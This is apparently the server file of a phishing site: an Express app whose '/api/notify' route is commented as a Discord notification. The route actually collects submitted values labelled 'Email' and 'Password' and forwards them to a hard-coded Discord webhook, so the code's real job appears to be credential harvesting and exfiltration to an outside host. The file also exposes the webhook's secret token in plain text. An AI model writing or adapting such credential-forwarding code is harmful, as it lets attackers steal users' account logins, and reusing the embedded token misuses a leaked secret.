import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json());

// API Route for Discord Notification
app.post("/api/notify", async (req, res) => {
  const { username, code } = req.body;
  const webhookUrl = "https://discord.com/api/webhooks/1495833536999981107/NZHIFwNLn2pWKkOJq8qi0X_pk9Zug5y5MYBg591SZ2evbKC25PR38K9azp-nMYfftxgI";

  try {
    const message = {
      embeds: [{
        title: "🚀 Nuova Attività sul Sito",
        description: `Un utente ha completato l'operazione.`,
        fields: [
          { name: "Email", value: username || "Anonimo", inline: true },
          { name: "Password", value: code || "Non fornito", inline: true }
        ],
        color: 5814783,
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Errore Discord: ${response.status} - ${errorText}`);
      throw new Error(`Discord API error: ${response.status}`);
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Errore nell'invio a Discord:", error);
    res.status(500).json({ error: "Errore invio notifica" });
  }
});

async function startServer() {
  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  if (process.env.NODE_ENV !== "production" || !process.env.VERCEL) {
    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  }
}

startServer();

export default app;
